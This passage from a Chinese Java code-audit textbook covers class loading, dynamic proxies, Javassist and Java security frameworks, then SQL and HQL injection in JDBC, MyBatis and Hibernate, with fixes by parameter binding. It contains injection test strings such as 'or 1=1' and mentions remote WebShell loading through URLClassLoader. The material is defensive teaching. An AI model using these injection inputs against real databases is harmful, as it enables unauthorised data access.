loadClass()方法与Class.forName的区别</h3><p>loadClass()方法只对类进行加载，不会对类进行初始化。Class.forName会默认对类进行初始化。当对类进行初始化时，静态的代码块就会得到执行，而代码块和构造函数则需要适合的类实例化才能得到执行，示例代码如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201627719.png" alt="image-20220420162757659"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201628104.png" alt="image-20220420162806050"></p><p>该示例代码的执行结果如图4-28所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201628293.png" alt="image-20220420162817172"></p><p>图4-28　静态代码执行结果</p><h3 id="4-6-5-URLClassLoader"><a href="#4-6-5-URLClassLoader" class="headerlink" title="4.6.5　URLClassLoader"></a>4.6.5　URLClassLoader</h3><p>URLClassLoader类是ClassLoader的一个实现，拥有从远程服务器上加载类的能力。通过URLClassLoader可以实现对一些WebShell的远程加载、对某个漏洞的深入利用。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201835567.png" alt="image-20220420183540508"></p><h2 id="4-7-Java动态代理"><a href="#4-7-Java动态代理" class="headerlink" title="4.7　Java动态代理"></a>4.7　Java动态代理</h2><p>代理是 Java中的一种设计模式，主要用于提供对目标对象另外的访问方式，即通过代理对象访问目标对象。这样，就可以在目标对象实现的基础上，加强额外的功能操作，实现扩展目标对象的功能。</p><p>代理模式的关键点在于代理对象和目标对象，代理对象是对目标对象的扩展，并且代理对象会调用目标对象。</p><p>Java 代理的方式有3种：静态代理、动态代理和CGLib代理，下面对这3种代理进行简单介绍。</p><h3 id="4-7-1-静态代理"><a href="#4-7-1-静态代理" class="headerlink" title="4.7.1　静态代理"></a>4.7.1　静态代理</h3><p>所谓静态代理，顾名思义，当确定代理对象和被代理对象后，就无法再去代理另一个对象。同理，在 Java 静态代理中，如果我们想要实现另一个代理，就需要重新写一个代理对象，其原理如图 4-29 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201838345.png" alt="image-20220420183827300"></p><p>图4-29　静态代理的原理</p><p>总而言之，在静态代理中，代理类和被代理类实现了同样的接口，代理类同时持有被代理类的引用。当我们需要调用被代理类的方法时，可以通过调用代理类的方法实现，静态代理的实现如图4-30所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201847802.png" alt="image-20220420184732732"></p><p>图4-30　静态代理的实现</p><h3 id="4-7-2-动态代理"><a href="#4-7-2-动态代理" class="headerlink" title="4.7.2　动态代理"></a>4.7.2　动态代理</h3><p>静态代理的优势很明显，即允许开发人员在不修改已有代码的前提下完成一些增强功能的需求。但是静态代理的缺点也很明显，它的使用会由于代理对象要实现与目标对象一致的接口，从而产生过多的代理类，造成冗余；其次，大量使用静态代理会使项目不易维护，一旦接口增加方法，目标对象与代理对象就要进行修改。而动态代理的优势在于可以很方便地对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。对于我们信息安全人员来说，动态代理意味着什么呢？实际上，Java 中的“动态”也就意味着使用了反射，因此动态代理其实是基于反射机制的一种代理模式。</p><p>如图4-31所示，动态代理与静态代理的区别在于，通过动态代理可以实现多个需求。动态代理其实是通过实现接口的方式来实现代理，具体来说，动态代理是通过Proxy类创建代理对象，然后将接口方法“代理”给InvocationHandler 接口完成的。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201854442.png" alt="image-20220420185402371"></p><p>图4-31　动态代理的实现</p><p>动态代理的关键有两个，即上文中提到的Proxy 类以及InvocationHandler接口，这是我们实现动态代理的核心。</p><h4 id="1．Proxy类"><a href="#1．Proxy类" class="headerlink" title="1．Proxy类"></a>1．Proxy类</h4><p>在JDK中，Java提供了Java.lang.reflect.InvocationHandler接口和 Java.lang. reflect.Proxy类，这两个类相互配合，其中Proxy类是入口。Proxy类是用来创建一个代理对象的类，它提供了很多方法。</p><p>static Invocation Handler get Invocation Handler (Objectproxy) ：该方法主要用于获取指定代理对象所关联的调用程序。</p><p>static Class<?> get Proxy Class (ClassLoader loader,Class<?>… interfaces) ：该方法主要用于返回指定接口的代理类。</p><p>static Object newProxyInstance (ClassLoader loader,Class&lt;?&gt;[] interfaces, Invocation Handler h)：该方法主要返回一个指定接口的代理类实例，该接口可以将方法调用指派到指定的调用处理程序。</p><p>static boolean is Proxy Class (Class&lt;?&gt; cl)：当且仅当指定的类通过 get Proxy Class 方法或 newProxyInstance 方法动态生成为代理类时，返回 true。该方法的可靠性对于使用它做出安全决策而言非常重要，所以它的实现不应仅测试相关的类是否可以扩展 Proxy。</p><p>在上述方法中，最常用的是newProxyInstance方法，该方法的作用是创建一个代理类对象，它接收3个参数：loader、interfaces以及h，各个参数含义如下。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">loader：这是一个ClassLoader对象，定义了由哪个ClassLoader对象对生成的代理类进行加载。<br><span class="hljs-built_in">int</span>erfaces：这是代理类要实现的接口列表，表示用户将要给代理对象提供的接口信息。如果提供了这样一个接口对象数组，就是声明代理类实现了这些接口，代理类即可调用接口中声明的所有方法。<br>h：这是指派方法调用的调用处理程序，是一个InvocationHandler对象，表示当动态代理对象调用方法时会关联到哪一个InvocationHandler对象上，并最终由其调用。<br></code></pre></td></tr></table></figure><h4 id="2．InvocationHandler-接口"><a href="#2．InvocationHandler-接口" class="headerlink" title="2．InvocationHandler 接口"></a>2．InvocationHandler 接口</h4><p>Java.lang.reflect InvocationHandler，主要方法为Objectinvoke（Object proxy, Method method, Object[] args），该方法定义了代理对象调用方法时希望执行的动作，用于集中处理在动态代理类对象上的方法调用。Invoke 有3个参数：proxy、method、args，各个参数含义如下。</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxy：在其上调用方法的代理实例。<br><span class="hljs-keyword">method</span>：对应于在代理实例上调用的接口方法的 <span class="hljs-title function_">Method</span> 实例。 <span class="hljs-title function_">Method</span> 对象的声明类将是在其中声明方法的接口，该接口可以是代理类赖以继承方法的代理接口的超接口。<span class="hljs-title function_">args</span>：包含传入代理实例上方法调用的参数值的对象数组，如果接口方法不使用参数，则为<span class="hljs-title function_">null</span>。基本类型的参数被包装在适当基本包装器类（如 <span class="hljs-title function_">Java</span>.<span class="hljs-title function_">lang</span>.<span class="hljs-title function_">Integer</span>或<span class="hljs-title function_">Java</span>.<span class="hljs-title function_">lang</span>.<span class="hljs-title function_">Boolean</span>）的实例中。<br></code></pre></td></tr></table></figure><h3 id="4-7-3-CGLib代理"><a href="#4-7-3-CGLib代理" class="headerlink" title="4.7.3　CGLib代理"></a>4.7.3　CGLib代理</h3><p>CGLib（Code Generation Library）是一个第三方代码生成类库，运行时在内存中动态生成一个子类对象，从而实现对目标对象功能的扩展。动态代理是基于Java反射机制实现的，必须实现接口的业务类才能使用这种办法生成代理对象。而CGLib则基于ASM机制实现，通过生成业务类的子类作为代理类。</p><p>与动态代理相比，动态代理只能基于接口设计，对于没有接口的情况，JDK方式无法解决，而CGLib则可以解决这一问题；其次，CGLib采用了非常底层的字节码技术，性能表现也很不错。</p><h2 id="4-8-Javassist动态编程"><a href="#4-8-Javassist动态编程" class="headerlink" title="4.8　Javassist动态编程"></a>4.8　Javassist动态编程</h2><p>在了解 Javassist 动态编程之前，首先来了解一下什么是动态编程。动态编程是相对于静态编程而言的一种编程形式，对于静态编程而言，类型检查是在编译时完成的，但是对于动态编程来说，类型检查是在运行时完成的。因此所谓动态编程就是绕过编译过程在运行时进行操作的技术。</p><p>那么动态编程可以解决什么样的问题呢？其实动态编程做的事情，静态编程也可以做到，但相对于动态编程来说，静态编程要实现动态编程所实现的功能，过程会比较复杂。一般来说，在依赖关系需要动态确认或者需要在运行时动态插入代码的环境中，需要使用动态编程。</p><p>Java字节码以二进制形式存储在 class 文件中，每一个class文件都包含一个 Java 类或接口。Javassist 就是一个用来处理Java字节码的类库，其主要优点在于简单、便捷。用户不需要了解虚拟机指令，就可以直接使用Java编码的形式，并且可以动态改变类的结构，或者动态生成类。</p><p>Javassist中最为重要的是ClassPool、CtClass 、CtMethod以及 CtField这4个类。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">ClassPool：一个基于HashMap实现的CtClass对象容器，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层<span class="hljs-keyword">JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。</span><br><span class="hljs-keyword"></span>CtClass：表示一个类，这些CtClass对象可以从ClassPool获得。<br>CtMethods：表示类中的方法。<br>CtFields：表示类中的字段。<br></code></pre></td></tr></table></figure><p>Javassist官方文档中给出的代码示例如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201922615.png" alt="image-20220420192207564"></p><p>这段程序首先获取ClassPool的实例，它主要用来修改字节码，里面存储着基于二进制文件构建的CtClass对象，它能够按需创建出CtClass对象并提供给后续处理流程使用。当需要进行类修改操作时，用户需要通过ClassPool实例的.get()方法获取CtClass对象。</p><p>我们可以从上面的代码中看出，ClassPool的getDefault()方法将会查找系统默认的路径来搜索test.Rectable对象，然后将获取到的CtClass对象赋值给cc变量。</p><p>这里仅是构造 ClassPool对象以及获取CTclass的过程，具体的Javassist的使用流程如图4-32所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201928408.png" alt="image-20220420192802343"></p><p>图4-32　Javassist的使用流程</p><p>操作Java字节码有两个比较流行的工具，即Javassist和ASM。Javassist的优点是提供了更高级的API，无须掌握字节码指令的知识，对使用者要求较低，但同时其执行效率相对较差；ASM则直接操作字节码指令，执行效率高，但要求使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。</p><p>安全人员能够利用 Javassist 对目标函数动态注入字节码代码。通过这种方式，我们可以劫持框架的关键函数，对中间件的安全进行测试，也可以劫持函数进行攻击阻断。此外，对于一些语言也可以很好地进行灰盒测试。</p><h2 id="4-9-可用于Java-Web的安全开发框架"><a href="#4-9-可用于Java-Web的安全开发框架" class="headerlink" title="4.9　可用于Java Web的安全开发框架"></a>4.9　可用于Java Web的安全开发框架</h2><p>安全是Java Web 应用开发中非常重要的一个方面。在开发应用的初期，安全就应该被考虑进来，如果不考虑安全问题，轻则无法满足用户的要求，影响应用的发布进程；重则可能会导致应用存在严重的安全漏洞，造成用户的隐私数据泄露。因此安全问题应该贯穿整个项目的生命周期。本节将简单介绍一些可用于 Java Web 安全开发的流行框架。</p><h3 id="4-9-1-Spring-Security"><a href="#4-9-1-Spring-Security" class="headerlink" title="4.9.1　Spring Security"></a>4.9.1　Spring Security</h3><p>Spring 是一个非常成功的 Java 应用开发框架。SpringSecurity 基于 Spring 框架，提供了一套 Web 应用安全性的完整解决方案，它能够为基于Spring的企业应用系统提供声明式的安全访问控制解决方案。一般来说，Web 应用的安全性包括用户认证（Authentication）和用户授权（Authorization）两个部分。用户认证指的是验证某个用户是否为系统中的合法主体，即判断用户能否访问该系统。用户认证一般要求用户提供用户名和密码。系统通过校验用户名和密码来完成认证过程。用户授权指的是验证某个用户是否有权限执行某个操作。在同一个系统中，不同用户所具有的权限是不同的。比如对一个文件来说，有的用户只能进行读取，而有的用户则可以进行修改。一般来说，系统会为不同的用户分配不同的角色，而每个角色则对应一系列的权限。</p><p>对于上面提到的两种应用情景，Spring Security 框架都有很好的支持。在用户认证方面，Spring Security 框架支持主流的认证方式，包括 HTTP 基本认证、HTTP 表单验证、HTTP摘要认证、OpenID 和 LDAP 等。在用户授权方面，SpringSecurity 提供了基于角色的访问控制和访问控制列表（AccessControl List，ACL），可以对应用中的领域对象进行细粒度的控制。</p><p>Spring Security 提供了一组可以在Spring应用上下文中配置的Bean，充分利用了Spring IoC（Inversion of Control , 控制反转）、DI（Dependency Injection , 依赖注入）和AOP（Aspect Oriented Programming , 面向切面编程）功能，为应用系统提供声明式的安全访问控制功能，减少了为企业系统安全控制编写大量重复代码的工作。</p><h3 id="4-9-2-Apache-Shiro"><a href="#4-9-2-Apache-Shiro" class="headerlink" title="4.9.2　Apache Shiro"></a>4.9.2　Apache Shiro</h3><p>Apache Shiro也是一个强大的Java安全框架，该框架能够用于身份验证、授权、加密和会话管理。与Spring Security 框架相同，Apache Shiro也是一个全面的、蕴含丰富功能的安全框架，描述Shiro功能的框架图如图4-33所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201942898.png" alt="image-20220420194254814"></p><p>图4-33　Shiro功能的框架图</p><p>在 Apache Shiro 框架中，开发团队提供了4个重点安全配置：Authentication（认证）、Authorization（授权）、Session Management（会话管理）、Cryptography（加密），其具体含义如下。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Authentication（认证）：用户身份识别，通常被称为用户“登录”。<br><br><span class="hljs-keyword">Authorization</span>（授权）：访问控制。比如某个用户是否具有某个操作的使用权限。<br><br><span class="hljs-keyword">Session</span> Management（会话管理）：特定于用户的会话管理,甚至在非Web 或 EJB 应用程序。<br><br>Cryptography（加密）：在对数据源使用加密算法加密的同时，保证易于使用。<br></code></pre></td></tr></table></figure><p>除上述场景外，在其他的应用程序环境中，还具有以下功能。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Web支持：<span class="hljs-keyword">Shiro的Web支持有助于保护Web应用程序。缓存：缓存是Apache </span><span class="hljs-keyword">Shiro </span>API中的第一级，以确保安全操作保持快速和高效。<br><br>并发性：Apache <span class="hljs-keyword">Shiro支持具有并发功能的多线程应用程序。测试：存在测试支持，可帮助用户编写单元测试和集成测试，并确保代码按预期得到保障。</span><br><span class="hljs-keyword"></span><br>运行方式：允许用户承担另一个用户的身份（如果允许）的功能，有时在管理方案中很有用。<br><br>记住我：记住用户在会话中的身份，用户启用该功能后只需要强制登录即可。<br></code></pre></td></tr></table></figure><p>Apache Shiro的首要目标是易于使用和理解。在开发时，安全需求有时可能非常复杂，Apache Shiro 框架做到了尽可能减少开发复杂性，创造了直观的API，简化了开发人员确保其应用程序安全的工作。</p><h3 id="4-9-3-OAuth-2-0"><a href="#4-9-3-OAuth-2-0" class="headerlink" title="4.9.3　OAuth 2.0"></a>4.9.3　OAuth 2.0</h3><p>OAuth（Open Authorization，开放授权）为用户资源的授权定义了一个安全、开发以及简单的标准，第三方无须知道用户的账号和密码，即可获取用户的授权信息。OAuth 2.0 是OAuth协议的延续版本，但是并不兼容OAuth 1.0。</p><p>不同的是，与Spring Security 和 Apache Shiro 两者相比，OAuth 2.0并非是一个Java Web 框架，而是一个用于授权的行业标准协议。在传统的客户端—服务器身份验证模型中，客户端通过使用资源所有者的凭据与服务器进行身份验证，请求服务器上的访问受限资源。为了向第三方应用程序提供对受限资源的访问，资源所有者与第三方共享其凭据，这就导致了以下问题。</p><p>第三方应用程序需要存储资源所有者的凭据以供将来使用，但是存储的形式一般是明文密码。</p><p>服务器需要支持密码验证。</p><p>第三方应用程序获得了对资源所有者受保护资源的过度使用权，使资源所有者无法限制持续访问时间或者访问有限的资源子集。</p><p>资源所有者无法选择不取消所有第三方访问的情况下去取消单个第三方访问。</p><p>OAuth通过引入授权层并将客户端角色与资源所有者的角色分离来解决这些问题。在OAuth中，客户机请求访问由资源所有者控制并由资源服务器托管的资源。此外，客户机被授予与资源所有者不同的凭据集。</p><p>客户机不使用资源所有者的凭据来访问受保护的资源，而是获取一个访问令牌—— 一个表示特定范围、生存周期以及其他访问属性的字符串。访问令牌由授权服务器在资源所有者的批准下颁发给第三方客户端。客户端使用访问令牌访问由资源服务器托管的受保护资源。图4-34所示为OAuth第三方授权时序图。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201949933.png" alt="image-20220420194944856"></p><p>图4-34　OAuth第三方授权时序图</p><p>当用户首次向第三方发起请求时，第三方向 OAuth 请求access_token 凭证。OAuth 会要求用户登录或者提供授权信息，当用户向 Web 站点提交授权信息后，会在cache中存储用户的登录 token，再将其返回给用户。用户提交授权信息后，访问授权页面。Web 站点检查其登录信息是否正确，若正确则获取当前用户信息并删除cache记录，最后将用户信息反馈给 OAuth，由 OAuth 返回给用户授权信息。用户确定授权后，第三方得到由 OAuth 分配的授权码，当用户下一次向第三方发起请求时，第三方直接向 OAuth 提交存储的授权码token即可获得用户信息。</p><p>值得一提的是，对于OAuth 2.0的使用场景，官方文档中提到的基本上都是针对第三方应用，但不要把第三方应用只当作其他公司或其他人开发的应用或系统。从广义上讲，我们自己开发的客户端也是一种第三方应用，只是我们的客户端是可以输入用户名密码获取令牌，而真正的第三方无法使用用户名和密码获取令牌，所以它们在流程上是有很大一部分是相似的。</p><h3 id="4-9-4-JWT"><a href="#4-9-4-JWT" class="headerlink" title="4.9.4　JWT"></a>4.9.4　JWT</h3><p>JSON Web Token（JWT）是一个开放标准（RFC7519），它定义了一种紧凑的、自包含的方式，用于在各方之间以JSON对象的形式安全地传输信息。与OAuth 2.0 不同，JWT是一种具体的 token 实现框架，而 OAuth 2.0 是一种授权协议，是规范，并不是实现。JWT比较适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其他业务逻辑所必需的声明信息。该token也可以直接用于认证，也可以被加密。</p><p>平时我们遇到的大部分 Internet 服务的身份验证过程是，首先由客户端向服务器发送登录名和登录密码，服务器验证后将权限、用户编号等信息保存到当前会话中；然后服务器向客户端返回 Session，Session信息会被写入客户端的 Cookie 中，后面的请求客户端都会首先尝试从Cookie中读取Session，之后将其发送给服务器，服务器在收到 Session 后会对比保存的数据来确认客户端身份。但这种模式存在一个问题，当有多个网站提供同一服务时，如果使用 Session 的方法，我们只能通过持久化 Session 数据的方式来实现在某一网站登录后，其他网站也同时登录，这种方式的缺点较明显，即修改架构很困难，需要重写验证逻辑，并且整体依赖于数据库。如果存储Session 会话的数据库宕机或者出现问题，则整个身份认证功能无法使用，进而导致系统无法登录。这时，JWT 就可以发挥作用。</p><p>在JWT中，客户端身份经过服务器验证通过后，会生成带有签名的JSON对象并将它返回给客户端，客户端在收到这个JSON对象后存储起来。在以后的请求中，客户端将JSON对象连同请求内容一起发送给服务器。服务器收到请求后通过 JSON 对象标识用户，如果验证不通过则不返回请求数据。因此，通过JWT，服务器不保存任何会话数据，使服务器更加容易扩展。</p><p>JWT 的优点有很多，如跨语言支持、便于传输、可以在自身存储一些其他业务逻辑所必需的非敏感信息以及易于应用的扩展等。但由于JWT是可以解密的，因此不应该在JWT的payload部分存放敏感信息。如果有敏感信息，则应该保护好secret私钥。该私钥非常重要，因为secret是保存在服务器端的，JWT的签发生成也在服务器端，secret则用来进行 JWT 的签发和JWT 的验证，所以secret就是服务端的私钥，在任何场景都不应该泄露。一旦 secret 被泄露，意味着攻击者可以利用该secret自我签发JWT，从而导致越权或者任意用户登录等漏洞。</p><p>以上是用于Java Web的安全开发框架的简单介绍，由于篇幅有限并未在本节中详细介绍其具体使用和配置方法，在后续的Java代码审计进阶版中，我们会对此进行详细介绍。</p><h1 id="第5章-“OWASP-Top-10-2017”漏洞的代码审计"><a href="#第5章-“OWASP-Top-10-2017”漏洞的代码审计" class="headerlink" title="第5章　“OWASP Top 10 2017”漏洞的代码审计"></a>第5章　“OWASP Top 10 2017”漏洞的代码审计</h1><p>OWASP（Open Web Application Security Project，开放式Web应用程序安全项目）是一个组织，它提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息，其目的是协助个人、企业和机构来发现和使用可信赖软件。其中OWASPTop 10（十大安全漏洞列表）颇具权威性。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201956417.png" alt="image-20220420195652322"></p><h2 id="5-1-注入"><a href="#5-1-注入" class="headerlink" title="5.1　注入"></a>5.1　注入</h2><h3 id="5-1-2-SQL注入"><a href="#5-1-2-SQL注入" class="headerlink" title="5.1.2　SQL注入"></a>5.1.2　SQL注入</h3><p>SQL注入（SQL Injection）是因为程序未能正确对用户的输入进行检查，将用户的输入以拼接的方式带入SQL语句中，导致了SQL注入的产生。黑客通过SQL注入可直接窃取数据库信息，造成信息泄露，因此，SQL注入在多年的OWASP TOP 10中稳居第一。本节将会介绍Java语言产生SQL注入的原因，以及框架使用不当所造成的SQL注入。</p><h4 id="1．JDBC拼接不当造成SQL注入"><a href="#1．JDBC拼接不当造成SQL注入" class="headerlink" title="1．JDBC拼接不当造成SQL注入"></a>1．JDBC拼接不当造成SQL注入</h4><p>JDBC有两种方法执行SQL语句，分别为PrepareStatement和Statement。两个方法的区别在于PrepareStatement会对SQL语句进行预编译，而Statement方法在每次执行时都需要编译，会增大系统开销。理论上PrepareStatement的效率和安全性会比Statement要好，但并不意味着使用PrepareStatement就绝对安全，不会产生SQL注入。</p><p>下面通过代码示例对使用Statement执行SQL语句进行介绍。这段代码使用拼接的方式将用户输入的参数“id”带入SQL语句中，创建Statement对象来进行SQL语句的执行。如以下代码所示，经过拼接构造后，最终在数据库执行的语句为“select * from user where id &#x3D; 1 or 1&#x3D;2”，改变了程序想要查询“id&#x3D;1”的语义，通过回显可以判断出存在SQL注入。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202013311.png" alt="image-20220420201337238"></p><p>PrepareStatement方法支持使用‘?’对变量位进行占位，在预编译阶段填入相应的值构造出完整的SQL语句，此时可以避免SQL注入的产生。但开发者有时为了便利，会直接采取拼接的方式构造SQL语句，此时进行预编译则无法阻止SQL注入的产生。如以下代码所示，&#x3D;&#x3D;PrepareStatement虽然进行了预编译&#x3D;&#x3D;，但在以拼接方式构造SQL语句的情况下仍然会产生SQL注入。代码示例如下（若使用“or 1&#x3D;1”，仍可判断出这段程序存在SQL注入）。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202028909.png" alt="image-20220420202837985"></p><p>正确地使用PrepareStatement可以有效避免SQL注入的产生，使用“?”作为占位符时，填入对应字段的值会进行严格的类型检查。&#x3D;&#x3D;将前面的“拼接构造SQL语句”改为如下“使用占位符构造SQL语句”的代码片段&#x3D;&#x3D;，即可有效避免SQL注入的产生。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202033884.png" alt="image-20220420203323818"></p><h4 id="2．框架使用不当造成SQL注入"><a href="#2．框架使用不当造成SQL注入" class="headerlink" title="2．框架使用不当造成SQL注入"></a>2．框架使用不当造成SQL注入</h4><p>在实际的代码开发工作中，JDBC方式是将SQL语句写在代码块中，不利于后续维护。如今的Java项目或多或少会使用对JDBC进行更抽象封装的持久化框架，如MyBatis和Hibernate。通常，框架底层已经实现了对SQL注入的防御，但在研发人员未能恰当使用框架的情况下，仍然可能存在SQL注入的风险。</p><p>下面通过MyBatis框架与Hibernate框架展开介绍。</p><h5 id="（1）MyBatis框架。"><a href="#（1）MyBatis框架。" class="headerlink" title="（1）MyBatis框架。"></a>（1）MyBatis框架。</h5><p>MyBatis框架的思想是将SQL语句编入配置文件中，避免SQL语句在Java程序中大量出现，方便后续对SQL语句的修改与配置。正确使用MyBatis框架可以有效地阻止SQL注入的产生，错误的使用则可能埋下安全隐患。</p><p>与$的区别如下。</p><p>MyBatis中使用parameterType向SQL语句传参，在SQL引用传参可以使用#{Parameter}和${Parameter}两种方式。</p><p>使用#{Parameter}构造SQL的代码如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202040565.png" alt="image-20220420204020515"></p><p>当输入的“name”值为“z1ng”时，成功查询到结果，Debug的回显如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202041239.png" alt="image-20220420204133177"></p><p>从Debug回显的SQL语句执行过程可以看出，使用#{Parameter}方式会使用“?”占位进行预编译，因此不存在SQL注入的问题。用户可以尝试构造“name”值为“z1ng or 1&#x3D;1”进行验证。回显如下，由于程序未查询到结果出现了空指针异常，因此此时不存在SQL注入。</p><p>使用${Parameter}构造SQL的代码如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202046126.png" alt="image-20220420204615076"></p><p>当输入的“name”值为“z1ng”时，成功查询到结果，Debug的回显如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202047131.png" alt="image-20220420204755070"></p><p>当输入的“name”值为“’aaaa’ or 1&#x3D;1”时，成功查询到结果，Debug的回显如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202049254.png" alt="image-20220420204906196"></p><p>根据Debug的回显可以看出，“name”值被拼接进SQL语句之中，因此此时存在SQL注入。</p><p>从上面的演示可以看出，在底层构造完整SQL语句时，MyBatis的两种传参方式所采取的方式不同。#{Parameter}采用预编译的方式构造SQL，避免了SQL注入的产生。而${Parameter}采用拼接的方式构造SQL，在对用户输入过滤不严格的前提下，此处很可能存在SQL注入。</p><h5 id="（2）Hibernate框架。"><a href="#（2）Hibernate框架。" class="headerlink" title="（2）Hibernate框架。"></a>（2）Hibernate框架。</h5><p>Hibernate框架是Java持久化API（JPA）规范的一种实现方式。Hibernate 将 Java 类映射到数据库表中，从 Java 数据类型映射到 SQL 数据类型。Hibernate是目前主流的Java数据库持久化框架，采用Hibernate查询语言（HQL）注入。</p><p>HQL的语法与SQL类似，但有些许不同。受语法的影响，HQL注入在实际漏洞利用上具有一定的限制。Hibernate是对持久化类的对象进行操作而不是直接对数据库进行操作，因此HQL查询语句由Hibernate引擎进行解析，这意味着产生的错误信息可能来自数据库，也可能来自Hibernate引擎。关键代码示例如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202119953.png" alt="image-20220420211914878"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202119003.png" alt="image-20220420211930951"></p><p>通过Debug模式可以清晰地观察到变量“parameter”被拼接进语句中，并将原本的语义改变，查询出结果。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202121614.png" alt="image-20220420212132542"></p><p>正确使用以下几种HQL参数绑定的方式可以有效避免注入的产生。</p><h5 id="1）位置参数（Positional-parameter）。"><a href="#1）位置参数（Positional-parameter）。" class="headerlink" title="1）位置参数（Positional parameter）。"></a>1）位置参数（Positional parameter）。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202126077.png" alt="image-20220420212645024"></h5><p>执行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Hibernate: <br>    select<br>        user0_.id as id1_0_,<br>        user0_.name as name2_0_ <br>    from<br>        User user0_ <br>    where<br>        user0_.name=?<br></code></pre></td></tr></table></figure><p>2）命名参数（named parameter）。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202126105.png" alt="image-20220420212655055"></p><p>3）命名参数列表（named parameter list）。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202127088.png" alt="image-20220420212705034"></p><p>4）类实例（JavaBean）。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202127295.png" alt="image-20220420212720244"></p><p>通过Debug可以观察出，以上几种方式都采用了预编译的方式进行构造SQL，从而避免了注入的产生。</p><p>Native SQL注入</p><p>Hibernate支持原生的SQL语句执行，与JDBC的SQL注入相同，直接拼接构造SQL语句会导致安全隐患的产生，应采用参数绑定的方式构造SQL语句。</p><p>拼接构造如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202131209.png" alt="image-20220420213110166"></p><p>参数绑定如下。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">Query&lt;User&gt; query = session.createNativeQuery(&quot;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> name = :name<span class="hljs-string">&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">query.setParameter(&quot;</span>name<span class="hljs-string">&quot;,parameter);</span><br></code></pre></td></tr></table></figure><h4 id="预编译一些场景下的局限"><a href="#预编译一些场景下的局限" class="headerlink" title="预编译一些场景下的局限"></a>预编译一些场景下的局限</h4><p>表名作为变量时，需使用拼接</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> `user`   <br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-meta">#报错</span><br></code></pre></td></tr></table></figure><p>order by后需要使用拼接</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span 